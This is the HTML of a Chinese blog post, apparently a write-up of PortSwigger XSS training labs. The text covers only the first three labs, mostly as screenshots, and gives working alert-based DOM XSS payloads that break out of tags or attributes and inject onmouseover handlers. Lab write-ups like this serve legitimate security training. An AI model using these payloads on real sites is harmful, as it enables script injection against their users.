<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="[!note]   Community Solutions 下面的视频质量都很高，可以进一步提高我们对每个 lab 及其知识点的理解，建议看一下。 payload 可以直接搜，没必要非得自己构造，重要的是学习渗透思路。portswiggerXSScheat-sheet、owsap cheat-sheet   1 Lab: Reflected XSS into HTML context with">
<meta property="og:type" content="article">
<meta property="og:title" content="PortSwigger xss labs">
<meta property="og:url" content="https://by-musi.github.io/2024/02/20/PortSwigger_xss_labs/index.html">
<meta property="og:site_name" content="OhMyDarkSpace">
<meta property="og:description" content="[!note]   Community Solutions 下面的视频质量都很高，可以进一步提高我们对每个 lab 及其知识点的理解，建议看一下。 payload 可以直接搜，没必要非得自己构造，重要的是学习渗透思路。portswiggerXSScheat-sheet、owsap cheat-sheet   1 Lab: Reflected XSS into HTML context with">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231122232408.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231122232249.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231122232332.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231122233548.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231122233735.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231122233822.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231122233857.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231123133807.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231123135504.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231123135020.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231123135219.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231123135946.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231128214457.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231128214215.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231128214304.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231123142021.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231123142007.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231123142209.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231123142335.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231123153437.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231123153659.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231123154043.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231123154112.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231123155703.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231123160034.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231123160228.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231123171205.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231123171303.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231123171544.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231123171429.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231123232127.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231123232417.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231123232707.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231124122025.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231124122048.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231124121952.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231124152550.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231124152723.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231124153236.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231124153756.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231124154701.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231124160437.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231124184926.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231124185126.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231124185554.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231124190423.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231124191152.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231124230410.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231124233300.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231124234608.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231124235745.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231125093721.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231125101815.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231125101801.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231125110242.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231125110355.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231125110328.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231125110603.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231125110707.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231125110829.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231125111116.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231125112340.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231125112406.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231125113011.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231125113147.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231125124411.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231125131130.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231125132414.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231125132432.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231125133248.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231125140427.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231125140628.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240128142419.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240128142949.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240128142914.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240128142933.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240128143455.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240128143908.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240128145344.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240128145812.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240128165506.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240128170104.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240128170754.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240128170719.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240128171237.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240128171333.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240128174205.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240128175834.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240128180142.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240128235513.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240128235859.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240129210600.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240129211318.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240130155652.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240130155911.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240130160303.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240130162404.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240130173442.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240130211830.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240130213154.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240130213454.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240130225536.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240131202249.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240131203125.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240131204154.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240131205048.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240131205001.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240131205350.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240131205341.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240131205915.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240131210111.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240131211313.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240131211454.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240131232206.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240201102540.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240131232916.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240201102959.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240201104837.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240201105054.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240201105533.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240203201854.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240203203113.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240203202735.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240203203539.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240203203743.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240203205015.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240203204654.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240203205308.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240203205827.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240205101848.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240205105912.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240205105829.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240205105813.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240205091711.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240205105300.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240205105322.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240205115211.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240205133010.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240205133033.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/a.png">
<meta property="og:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20240205134534.png">
<meta property="article:published_time" content="2024-02-19T16:00:00.000Z">
<meta property="article:modified_time" content="2024-02-20T14:04:54.401Z">
<meta property="article:author" content="CaiShao">
<meta property="article:tag" content="web">
<meta property="article:tag" content="xss">
<meta property="article:tag" content="writeup">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://by-musi.github.io/images/2024/02/20/Pasted_image_20231122232408.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>PortSwigger xss labs</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	

  <!-- fancybox -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
  
<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="OhMyDarkSpace" type="application/atom+xml">
<link rel="alternate" href="/rss2.xml" title="OhMyDarkSpace" type="application/rss+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a href="/tags/">标签</a></li><!--
     --><!--
       --><li><a href="/search/">搜索</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2024/02/20/PortSwigger_access_control_Labs/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2024/02/11/2023_%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://by-musi.github.io/2024/02/20/PortSwigger_xss_labs/&title=PortSwigger xss labs"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-Lab-Reflected-XSS-into-HTML-context-with-nothing-encoded"><span class="toc-number">1.</span> <span class="toc-text">1 Lab: Reflected XSS into HTML context with nothing encoded</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-Lab-Stored-XSS-into-HTML-context-with-nothing-encoded"><span class="toc-number">2.</span> <span class="toc-text">2 Lab: Stored XSS into HTML context with nothing encoded</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-Lab-DOM-XSS-in-document-write-sink-using-source-location-search"><span class="toc-number">3.</span> <span class="toc-text">3 Lab: DOM XSS in document.write sink using source location.search</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-Lab-DOM-XSS-in-document-write-sink-using-source-location-search-inside-a-select-element"><span class="toc-number">4.</span> <span class="toc-text">4 Lab: DOM XSS in document.write sink using source location.search inside a select element</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-Lab-DOM-XSS-in-innerHTML-sink-using-source-location-search"><span class="toc-number">5.</span> <span class="toc-text">5 Lab: DOM XSS in innerHTML sink using source location.search</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-Lab-DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source"><span class="toc-number">6.</span> <span class="toc-text">6 Lab: DOM XSS in jQuery anchor href attribute sink using location.search source</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-Lab-DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event"><span class="toc-number">7.</span> <span class="toc-text">7 Lab: DOM XSS in jQuery selector sink using a hashchange event</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8-Lab-Reflected-DOM-XSS"><span class="toc-number">8.</span> <span class="toc-text">8 Lab: Reflected DOM XSS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#9-Lab-Stored-DOM-XSS"><span class="toc-number">9.</span> <span class="toc-text">9 Lab: Stored DOM XSS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#10-Lab-Reflected-XSS-into-HTML-context-with-most-tags-and-attributes-blocked"><span class="toc-number">10.</span> <span class="toc-text">10 Lab: Reflected XSS into HTML context with most tags and attributes blocked</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#11-Lab-Reflected-XSS-into-HTML-context-with-all-tags-blocked-except-custom-ones"><span class="toc-number">11.</span> <span class="toc-text">11 Lab: Reflected XSS into HTML context with all tags blocked except custom ones</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#12-Lab-Reflected-XSS-into-attribute-with-angle-brackets-HTML-encoded"><span class="toc-number">12.</span> <span class="toc-text">12 Lab: Reflected XSS into attribute with angle brackets HTML-encoded</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#13-Lab-Stored-XSS-into-anchor-href-attribute-with-double-quotes-HTML-encoded"><span class="toc-number">13.</span> <span class="toc-text">13 Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#14-Lab-Reflected-XSS-in-canonical-link-tag"><span class="toc-number">14.</span> <span class="toc-text">14 Lab: Reflected XSS in canonical link tag</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#15-Lab-Reflected-XSS-into-a-JavaScript-string-with-single-quote-and-backslash-escaped"><span class="toc-number">15.</span> <span class="toc-text">15 Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#16-Lab-Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-HTML-encoded"><span class="toc-number">16.</span> <span class="toc-text">16 Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#17-Lab-Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-escaped"><span class="toc-number">17.</span> <span class="toc-text">17 Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#18-Lab-Stored-XSS-into-onclick-event-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-and-backslash-escaped"><span class="toc-number">18.</span> <span class="toc-text">18 Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#19-Lab-Reflected-XSS-in-a-JavaScript-URL-with-some-characters-blocked"><span class="toc-number">19.</span> <span class="toc-text">19 Lab: Reflected XSS in a JavaScript URL with some characters blocked</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#20-Lab-Reflected-XSS-into-a-template-literal-with-angle-brackets-single-double-quotes-backslash-and-backticks-Unicode-escaped"><span class="toc-number">20.</span> <span class="toc-text">20 Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#21-Lab-Reflected-XSS-with-some-SVG-markup-allowed"><span class="toc-number">21.</span> <span class="toc-text">21 Lab: Reflected XSS with some SVG markup allowed</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#22-Lab-Exploiting-cross-site-scripting-to-steal-cookies"><span class="toc-number">22.</span> <span class="toc-text">22 Lab: Exploiting cross-site scripting to steal cookies</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#23-Lab-Reflected-XSS-protected-by-very-strict-CSP-with-dangling-markup-attack"><span class="toc-number">23.</span> <span class="toc-text">23 Lab: Reflected XSS protected by very strict CSP, with dangling markup attack</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#24-Lab-Exploiting-cross-site-scripting-to-capture-passwords"><span class="toc-number">24.</span> <span class="toc-text">24 Lab: Exploiting cross-site scripting to capture passwords</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        PortSwigger xss labs
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">CaiShao</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-02-19T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-02-20</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/web/" rel="tag">web</a>, <a class="p-category" href="/tags/writeup/" rel="tag">writeup</a>, <a class="p-category" href="/tags/xss/" rel="tag">xss</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <blockquote>
<p>[!note] </p>
<ol>
<li>Community Solutions 下面的视频质量都很高，可以进一步提高我们对每个 lab 及其知识点的理解，建议看一下。</li>
<li>payload 可以直接搜，没必要非得自己构造，重要的是学习渗透思路。<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">portswiggerXSScheat-sheet</a>、<a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">owsap cheat-sheet</a></li>
</ol>
</blockquote>
<h1 id="1-Lab-Reflected-XSS-into-HTML-context-with-nothing-encoded"><a href="#1-Lab-Reflected-XSS-into-HTML-context-with-nothing-encoded" class="headerlink" title="1 Lab: Reflected XSS into HTML context with nothing encoded"></a>1 Lab: Reflected XSS into HTML context with nothing encoded</h1><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231122232408.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231122232408.png"></a></p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231122232249.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231122232249.png"></a></p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231122232332.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231122232332.png"></a></p>
<h1 id="2-Lab-Stored-XSS-into-HTML-context-with-nothing-encoded"><a href="#2-Lab-Stored-XSS-into-HTML-context-with-nothing-encoded" class="headerlink" title="2 Lab: Stored XSS into HTML context with nothing encoded"></a>2 Lab: Stored XSS into HTML context with nothing encoded</h1><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231122233548.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231122233548.png"></a></p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231122233735.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231122233735.png"></a></p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231122233822.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231122233822.png"></a></p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231122233857.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231122233857.png"></a></p>
<h1 id="3-Lab-DOM-XSS-in-document-write-sink-using-source-location-search"><a href="#3-Lab-DOM-XSS-in-document-write-sink-using-source-location-search" class="headerlink" title="3 Lab: DOM XSS in document.write sink using source location.search"></a>3 Lab: DOM XSS in <code>document.write</code> sink using source <code>location.search</code></h1><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123133807.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123133807.png"></a></p>
<p><code>ctrl+shift+f</code> 全局搜索 <code>location.search</code>。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123135504.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123135504.png"></a></p>
<p>函数 <code>trackSearch()</code> 使用 <code>document.write</code> 在上下两个 section 中写入一个 <code>&lt;img&gt;</code> 标签。<code>location.search</code> 从 url <code>https://0ae0002203c0668a84176d2100500026.web-security-academy.net/?search=1655452184</code>中拿到参数 <code>search</code> 的值并赋值给 <code>query</code>。   GET 方法</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123135020.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123135020.png"></a></p>
<p>payload: <code>&quot;&gt; &lt;script&gt;alert(/xss/)&lt;/script&gt; &quot;&lt;</code></p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123135219.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123135219.png"></a></p>
<p>拿下！</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123135946.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123135946.png"></a></p>
<p>payload2 <strong>闭合属性</strong>完成 XSS: <code>&quot; onmouseover=alert(/xss/)&quot;</code></p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231128214457.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231128214457.png"></a><br>img 就一个像素，难以触发 emmm</p>
<p>重新构造 payload <code>&quot; style=&quot;width:30px;height:30px;background-color:red;&quot; onmouseover=alert(/xss/) &quot;</code></p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231128214215.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231128214215.png"></a></p>
<p>鼠标移动到 img 区域，触发 xss。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231128214304.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231128214304.png"></a></p>
